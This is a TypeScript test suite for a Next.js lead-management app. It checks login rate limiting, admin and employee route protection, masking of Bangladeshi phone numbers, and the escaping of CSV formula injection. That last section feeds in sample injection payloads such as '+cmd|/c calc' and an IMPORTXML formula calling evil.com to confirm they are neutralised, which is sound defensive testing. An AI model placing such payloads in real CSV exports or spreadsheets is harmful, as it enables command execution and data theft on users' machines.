import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import { NextRequest } from 'next/server';
import prisma from '../src/lib/prisma';
import { checkRateLimit, resetRateLimit } from '../src/lib/rate-limit';
import { POST as loginPost } from '../src/app/api/auth/login/route';
import { middleware } from '../src/middleware';
import { maskPhone, isValidBdPhone, normalizePhone } from '../src/lib/phone';
import { sanitizeCsvCell, parseAndValidateCsv, exportInvalidRowsToCsv } from '../src/lib/csv';
import { signToken } from '../src/lib/auth';

// Mutable mock session user for route tests
const currentMockUser = {
  id: '',
  userId: '',
  name: '',
  email: '',
  role: 'ADMIN' as 'ADMIN' | 'EMPLOYEE',
  phone: null as string | null,
};

vi.mock('@/lib/session', () => ({
  COOKIE_NAME: 'auth_token',
  getSession: vi.fn(async () => {
    if (!currentMockUser.userId) return null;
    return { ...currentMockUser };
  }),
  requireAuth: vi.fn(async () => {
    if (!currentMockUser.userId) throw new Error('UNAUTHORIZED');
    return { ...currentMockUser };
  }),
  requireAdmin: vi.fn(async () => {
    if (!currentMockUser.userId) throw new Error('UNAUTHORIZED');
    if (currentMockUser.role !== 'ADMIN') throw new Error('FORBIDDEN');
    return { ...currentMockUser };
  }),
  requireEmployee: vi.fn(async () => {
    if (!currentMockUser.userId) throw new Error('UNAUTHORIZED');
    if (currentMockUser.role !== 'EMPLOYEE') throw new Error('FORBIDDEN');
    return { ...currentMockUser };
  }),
  setSessionCookie: vi.fn(async () => {}),
  removeSessionCookie: vi.fn(async () => {}),
}));

import { GET as getLeadDetail } from '../src/app/api/leads/[id]/route';
import { GET as getLeadsList } from '../src/app/api/leads/route';

describe('Section 11: Security & Rate Limiting Hardening Tests', () => {
  let adminUser: any;
  let employeeUserA: any;
  let employeeUserB: any;
  let leadOwnedByA: any;
  let leadOwnedByB: any;
  let adminToken: string;
  let employeeTokenA: string;
  let employeeTokenB: string;

  beforeAll(async () => {
    // Clean up test fixtures if previously created
    await prisma.leadNote.deleteMany({
      where: { lead: { name: { in: ['Sec Test Lead A', 'Sec Test Lead B'] } } },
    });
    await prisma.lead.deleteMany({
      where: { name: { in: ['Sec Test Lead A', 'Sec Test Lead B'] } },
    });
    await prisma.user.deleteMany({
      where: {
        email: { in: ['sec_admin@test.com', 'sec_empa@test.com', 'sec_empb@test.com'] },
      },
    });

    const dummyHash = '$2a$12$e8Y4V4H799cMfsj1883Y2.fB13p14Hj9Nf0xXU5f1qKqL1GZ9uI/a';

    adminUser = await prisma.user.create({
      data: {
        name: 'Sec Admin',
        email: 'sec_admin@test.com',
        password_hash: dummyHash,
        role: 'ADMIN',
        phone: '01711000001',
      },
    });

    employeeUserA = await prisma.user.create({
      data: {
        name: 'Sec Employee A',
        email: 'sec_empa@test.com',
        password_hash: dummyHash,
        role: 'EMPLOYEE',
        phone: '01811000002',
      },
    });

    employeeUserB = await prisma.user.create({
      data: {
        name: 'Sec Employee B',
        email: 'sec_empb@test.com',
        password_hash: dummyHash,
        role: 'EMPLOYEE',
        phone: '01911000003',
      },
    });

    leadOwnedByA = await prisma.lead.create({
      data: {
        name: 'Sec Test Lead A',
        phone: '01712345678',
        source_channel: 'Facebook Group',
        owner_id: employeeUserA.id,
        status: 'NEW',
      },
    });

    leadOwnedByB = await prisma.lead.create({
      data: {
        name: 'Sec Test Lead B',
        phone: '01898765432',
        source_channel: 'Direct Call',
        owner_id: employeeUserB.id,
        status: 'QUALIFIED',
      },
    });

    adminToken = await signToken({
      id: adminUser.id,
      userId: adminUser.id,
      name: adminUser.name,
      email: adminUser.email,
      role: 'ADMIN',
    });

    employeeTokenA = await signToken({
      id: employeeUserA.id,
      userId: employeeUserA.id,
      name: employeeUserA.name,
      email: employeeUserA.email,
      role: 'EMPLOYEE',
    });

    employeeTokenB = await signToken({
      id: employeeUserB.id,
      userId: employeeUserB.id,
      name: employeeUserB.name,
      email: employeeUserB.email,
      role: 'EMPLOYEE',
    });
  });

  afterAll(async () => {
    // Teardown
    await prisma.leadNote.deleteMany({
      where: { lead: { name: { in: ['Sec Test Lead A', 'Sec Test Lead B'] } } },
    });
    await prisma.lead.deleteMany({
      where: { name: { in: ['Sec Test Lead A', 'Sec Test Lead B'] } },
    });
    await prisma.user.deleteMany({
      where: {
        email: { in: ['sec_admin@test.com', 'sec_empa@test.com', 'sec_empb@test.com'] },
      },
    });
  });

  // ==========================================
  // 1. LOGIN RATE LIMITING (5 attempts / min)
  // ==========================================
  describe('1. Login Rate Limiting (5 attempts per minute per IP)', () => {
    const testIp = '198.51.100.42';

    beforeAll(() => {
      resetRateLimit(testIp);
    });

    it('should allow exactly 5 attempts and block the 6th attempt with allowed = false', () => {
      // Attempts 1 to 5
      for (let i = 1; i <= 5; i++) {
        const check = checkRateLimit(testIp, 5, 60000);
        expect(check.allowed).toBe(true);
        expect(check.remaining).toBe(5 - i);
      }

      // 6th attempt must be blocked
      const blocked = checkRateLimit(testIp, 5, 60000);
      expect(blocked.allowed).toBe(false);
      expect(blocked.remaining).toBe(0);
      expect(blocked.resetSeconds).toBeGreaterThan(0);
    });

    it('should reset rate limit when resetRateLimit is called', () => {
      resetRateLimit(testIp);
      const fresh = checkRateLimit(testIp, 5, 60000);
      expect(fresh.allowed).toBe(true);
      expect(fresh.remaining).toBe(4);
    });

    it('should enforce 429 Too Many Requests in POST /api/auth/login after 5 failed attempts', async () => {
      const loginRouteIp = '198.51.100.99';
      resetRateLimit(loginRouteIp);

      const makeFailedLoginRequest = () =>
        new NextRequest('http://localhost:3000/api/auth/login', {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-forwarded-for': loginRouteIp,
          },
          body: JSON.stringify({
            email: 'nonexistent@example.com',
            password: 'WrongPassword123!',
          }),
        });

      // Attempts 1 through 5: 401 Unauthorized
      for (let i = 1; i <= 5; i++) {
        const res = await loginPost(makeFailedLoginRequest());
        expect(res.status).toBe(401);
      }

      // 6th attempt: 429 Too Many Requests
      const blockedRes = await loginPost(makeFailedLoginRequest());
      expect(blockedRes.status).toBe(429);

      const body = await blockedRes.json();
      expect(body.error).toContain('অতিরিক্ত চেষ্টার কারণে লগইন সাময়িক বন্ধ আছে');
      expect(blockedRes.headers.get('Retry-After')).toBeDefined();
      expect(blockedRes.headers.get('X-RateLimit-Remaining')).toBe('0');

      // A different IP should NOT be blocked
      const differentIpReq = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-forwarded-for': '198.51.100.100',
        },
        body: JSON.stringify({
          email: 'nonexistent@example.com',
          password: 'WrongPassword123!',
        }),
      });
      const differentIpRes = await loginPost(differentIpReq);
      expect(differentIpRes.status).toBe(401); // 401, not 429!
    });
  });

  // ==========================================
  // 2. ROUTE PROTECTION & ROLE ENFORCEMENT
  // ==========================================
  describe('2. Route Protection & Role Enforcement (Middleware & API)', () => {
    it('should block Employee accessing /api/admin/* with 403 Forbidden', async () => {
      const req = new NextRequest('http://localhost:3000/api/admin/employees', {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });

      const res = await middleware(req);
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toContain('Forbidden');
    });

    it('should block unauthenticated access to /api/admin/* with 401 Unauthorized', async () => {
      const req = new NextRequest('http://localhost:3000/api/admin/sections');
      const res = await middleware(req);
      expect(res.status).toBe(401);
      const data = await res.json();
      expect(data.error).toContain('Unauthorized');
    });

    it('should allow Admin access to /api/admin/* through middleware', async () => {
      const req = new NextRequest('http://localhost:3000/api/admin/sections', {
        headers: {
          cookie: `auth_token=${adminToken}`,
        },
      });

      const res = await middleware(req);
      expect(res.status).toBe(200); // NextResponse.next()
    });

    it('should block unauthenticated access to /api/employee/* with 401 Unauthorized', async () => {
      const req = new NextRequest('http://localhost:3000/api/employee/work');
      const res = await middleware(req);
      expect(res.status).toBe(401);
    });

    it('should allow Employee access to /api/employee/* through middleware', async () => {
      const req = new NextRequest('http://localhost:3000/api/employee/work', {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });

      const res = await middleware(req);
      expect(res.status).toBe(200);
    });

    it('should redirect unauthenticated users visiting /admin page routes to /login', async () => {
      const req = new NextRequest('http://localhost:3000/admin/dashboard');
      const res = await middleware(req);
      expect(res.status).toBe(307);
      expect(res.headers.get('location')).toContain('/login');
    });

    it('should redirect Employee visiting /admin page routes to /employee/my-work', async () => {
      const req = new NextRequest('http://localhost:3000/admin/dashboard', {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });
      const res = await middleware(req);
      expect(res.status).toBe(307);
      expect(res.headers.get('location')).toContain('/employee/my-work');
    });
  });

  // ==========================================
  // 3. PHONE NUMBER MASKING & PRIVACY RULES
  // ==========================================
  describe('3. Phone Number Masking & Access Control', () => {
    it('should mask Bangladeshi phone numbers to format 017XX-XX5678', () => {
      expect(maskPhone('01712345678')).toBe('017XX-XX5678');
      expect(maskPhone('01811223344')).toBe('018XX-XX3344');
      expect(maskPhone('01999887766')).toBe('019XX-XX7766');
    });

    it('should normalize and mask phone numbers with country code or spacing', () => {
      expect(maskPhone('+8801712345678')).toBe('017XX-XX5678');
      expect(maskPhone('8801712345678')).toBe('017XX-XX5678');
      expect(maskPhone('017-1234-5678')).toBe('017XX-XX5678');
      expect(maskPhone('017 1234 5678')).toBe('017XX-XX5678');
    });

    it('should handle invalid or short phone numbers gracefully without throwing', () => {
      expect(maskPhone('')).toBe('');
      expect(maskPhone('12345')).toBe('12345');
    });

    it('should mask phone numbers in /api/leads for non-admin users', async () => {
      Object.assign(currentMockUser, {
        id: employeeUserA.id,
        userId: employeeUserA.id,
        name: employeeUserA.name,
        email: employeeUserA.email,
        role: 'EMPLOYEE',
      });

      const req = new NextRequest('http://localhost:3000/api/leads', {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });

      const res = await getLeadsList(req);
      expect(res.status).toBe(200);

      const body = await res.json();
      expect(body.leads).toBeDefined();
      expect(body.leads.length).toBeGreaterThan(0);

      // Verify that phone number is masked for employee
      for (const lead of body.leads) {
        expect(lead.masked_phone).toMatch(/^01\dXX-XX\d{4}$/);
        expect(lead.phone).toMatch(/^01\dXX-XX\d{4}$/); // raw phone is masked
        expect(lead.phone).not.toEqual('01712345678');
      }
    });

    it('should allow unmasked phone numbers in /api/leads for ADMIN', async () => {
      Object.assign(currentMockUser, {
        id: adminUser.id,
        userId: adminUser.id,
        name: adminUser.name,
        email: adminUser.email,
        role: 'ADMIN',
      });

      const req = new NextRequest('http://localhost:3000/api/leads', {
        headers: {
          cookie: `auth_token=${adminToken}`,
        },
      });

      const res = await getLeadsList(req);
      expect(res.status).toBe(200);

      const body = await res.json();
      expect(body.leads).toBeDefined();

      const leadA = body.leads.find((l: any) => l.id === leadOwnedByA.id);
      expect(leadA).toBeDefined();
      expect(leadA.phone).toBe('01712345678'); // Full unmasked for Admin
      expect(leadA.masked_phone).toBe('017XX-XX5678');
    });

    it('should allow lead owner to see unmasked phone on detail /api/leads/[id]', async () => {
      Object.assign(currentMockUser, {
        id: employeeUserA.id,
        userId: employeeUserA.id,
        name: employeeUserA.name,
        email: employeeUserA.email,
        role: 'EMPLOYEE',
      });

      const req = new NextRequest(`http://localhost:3000/api/leads/${leadOwnedByA.id}`, {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });

      const res = await getLeadDetail(req, {
        params: Promise.resolve({ id: leadOwnedByA.id }),
      });
      expect(res.status).toBe(200);

      const body = await res.json();
      expect(body.lead).toBeDefined();
      expect(body.lead.phone).toBe('01712345678'); // Unmasked for owner
    });

    it('should reject non-owner Employee accessing another employees lead detail with 403 Forbidden', async () => {
      Object.assign(currentMockUser, {
        id: employeeUserA.id,
        userId: employeeUserA.id,
        name: employeeUserA.name,
        email: employeeUserA.email,
        role: 'EMPLOYEE',
      });

      // Employee A tries to view Lead B (owned by Employee B)
      const req = new NextRequest(`http://localhost:3000/api/leads/${leadOwnedByB.id}`, {
        headers: {
          cookie: `auth_token=${employeeTokenA}`,
        },
      });

      const res = await getLeadDetail(req, {
        params: Promise.resolve({ id: leadOwnedByB.id }),
      });
      expect(res.status).toBe(403);

      const body = await res.json();
      expect(body.error).toContain('অ্যাক্সেস নেই');
    });

    it('should allow ADMIN to access any lead detail with unmasked phone', async () => {
      Object.assign(currentMockUser, {
        id: adminUser.id,
        userId: adminUser.id,
        name: adminUser.name,
        email: adminUser.email,
        role: 'ADMIN',
      });

      const req = new NextRequest(`http://localhost:3000/api/leads/${leadOwnedByB.id}`, {
        headers: {
          cookie: `auth_token=${adminToken}`,
        },
      });

      const res = await getLeadDetail(req, {
        params: Promise.resolve({ id: leadOwnedByB.id }),
      });
      expect(res.status).toBe(200);

      const body = await res.json();
      expect(body.lead.phone).toBe('01898765432'); // Full unmasked for Admin
    });
  });

  // ==========================================
  // 4. CSV FORMULA INJECTION ESCAPING
  // ==========================================
  describe('4. CSV Formula Injection Escaping', () => {
    it('should prefix single quote on cells starting with =, +, -, @', () => {
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
      expect(sanitizeCsvCell('+cmd|/c calc')).toBe("'+cmd|/c calc");
      expect(sanitizeCsvCell('-5000')).toBe("'-5000");
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com","//a")')).toBe(
        "'@IMPORTXML(\"http://evil.com\",\"//a\")"
      );
    });

    it('should sanitize cells with leading whitespace before formula characters', () => {
      expect(sanitizeCsvCell('   =2+5')).toBe("'=2+5");
      expect(sanitizeCsvCell('  +cmd')).toBe("'+cmd");
      expect(sanitizeCsvCell('  -10')).toBe("'-10");
      expect(sanitizeCsvCell('  @SUM')).toBe("'@SUM");
    });

    it('should sanitize cells starting with tab or carriage return characters', () => {
      expect(sanitizeCsvCell('\t=cmd')).toBe("'\t=cmd");
      expect(sanitizeCsvCell('\r+cmd')).toBe("'\r+cmd");
    });

    it('should NOT alter safe, normal text', () => {
      expect(sanitizeCsvCell('Dhaka Farmers Group')).toBe('Dhaka Farmers Group');
      expect(sanitizeCsvCell('https://www.facebook.com/groups/validgroup')).toBe(
        'https://www.facebook.com/groups/validgroup'
      );
      expect(sanitizeCsvCell('বাংলা টাইটেল')).toBe('বাংলা টাইটেল');
    });

    it('should handle null, undefined, numbers, and empty strings safely', () => {
      expect(sanitizeCsvCell('')).toBe('');
      expect(sanitizeCsvCell(null)).toBe('');
      expect(sanitizeCsvCell(undefined)).toBe('');
      expect(sanitizeCsvCell(1234)).toBe('1234');
      expect(sanitizeCsvCell(-500)).toBe("'-500");
    });

    it('should sanitize titles in parseAndValidateCsv to prevent formula execution', () => {
      const maliciousCsv = `url,title
https://www.facebook.com/groups/safe1,=SUM(A1:B10)
https://www.facebook.com/groups/safe2,+cmd|' /C calc'!A0
https://www.facebook.com/groups/safe3,@evil_macro()`;

      const result = parseAndValidateCsv(maliciousCsv);
      expect(result.validCount).toBe(3);
      expect(result.validRowsToInsert[0].title).toBe("'=SUM(A1:B10)");
      expect(result.validRowsToInsert[1].title).toBe("'+cmd|' /C calc'!A0");
      expect(result.validRowsToInsert[2].title).toBe("'@evil_macro()");
    });

    it('should sanitize exported invalid rows CSV in exportInvalidRowsToCsv', () => {
      const invalidRows = [
        {
          rowNumber: 2,
          url: '=cmd|/c calc',
          title: '+Malicious Title',
          reason: '@Error Injection Reason',
        },
      ];

      const csvOutput = exportInvalidRowsToCsv(invalidRows);
      expect(csvOutput).toContain("'=cmd|/c calc");
      expect(csvOutput).toContain("'+Malicious Title");
      expect(csvOutput).toContain("'@Error Injection Reason");
    });
  });
});
